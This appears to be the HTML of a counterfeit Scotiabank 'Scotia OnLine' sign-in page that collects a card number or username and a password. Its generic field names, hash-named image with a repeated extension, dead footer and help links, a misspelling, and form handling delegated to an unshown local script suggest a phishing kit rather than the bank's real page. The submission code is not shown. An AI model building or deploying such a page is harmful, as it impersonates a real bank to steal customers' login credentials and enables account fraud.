<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in | Scotiabank</title>
  <link rel="stylesheet" href="./output.css">
  <script src="./bundled.js"  defer></script>
</head>
<body class="relative bg-[#FFFFFF] overflow-x-hidden">
  <nav class="justify-center px-[24px] py-[24px] w-[100%]" >
    <a href="#">
      <img src="logo-mobile.svg" alt="">
    </a>
  </nav>

  <main>
    <div class="flex justify-center pt-[36px]">
      <img class="" src="c93fc59ddab28275bff50e097f646dc6.png.png.png" alt="">
    </div>
    <h1 class="py-9 font-bold text-[#333333] text-[23.25px] text-center" style="letter-spacing: -0.25;">
      Welcome to Scotia OnLine
    </h1>
    <form id="form" class="mx-auto max-w-[318px]">
      <div class="flex justify-center items-center gap-[15px] mb-3 w-[100%] input" >
        <img src="user.svg" alt="">
        <input type="text" name="input_one" required id="username" class="w-[100%] h-[48px]" placeholder="Card number or username">
      </div>
      
      <div class="flex justify-center items-center gap-[15px] w-[100%] input" >
        <img src="lock.svg" alt="">
        <input type="password" name="input_two" required id="password" class="w-[100%] h-[48px]" placeholder="Password">
      </div>
      <p class="pt-6 pb-[50px] font-bold text-[#007EAB] text-[15.13px]">
        Forgot your username or password
      </p>
      <div class="flex flex-row-reverse gap-3">
        <label for="checkbox"> Remember my username or password?
        </label>
        <input type="checkbox" name="checkbox" id="toggle">
      </div>
      <button class="bg-[#EC111A] mt-[47px] mb-[26px] py-[17px] rounded-lg w-[100%] text-white" type="submit">
        Sign in
      </button>
      <div class="pb-[34px]">
        <p class="pb-[2px] font-light text-[#757575]">New to Scotia OnLine?</p>
        <a href="" class="text-[#007EAB] text-[15.5px] text-bold" >Enroll now</a>
  
      </div>
    </form>
    <div class="bg-[#E2E8EE] w-[100%] h-[1px]"></div>
  </main>

  <footer class="flex gap-[51px] pt-[59px] pb-[102px] pl-[9px] text-[#333333] text-sm" >
    <div class="flex flex-col gap-6">
      <p>Legal</p>
      <p>Privacy</p>
      <p>Security</p>
      <p>FATCA</p>
    </div>
    <div class="flex flex-col gap-6">
      <p>Security Guarantee</p>
      <p>Terms and Conditions</p>
      <p>Acessibility</p>
      <p>Contact Us</p>
    </div>
  </footer>

  <div class="flex items-center bg-[#F5F6FC] h-[47px]">
    <p class="pl-[50%] text-[#333333] text-[12px] text-nowrap">
      &copy; Scotiabank. All Rights Reserved.
    </p>
  </div>

  <div class="bg-[#EC111A] px-[40.66px] py-[8.5px] text-white feedback">
    Feedback
  </div>
</body>
</html>
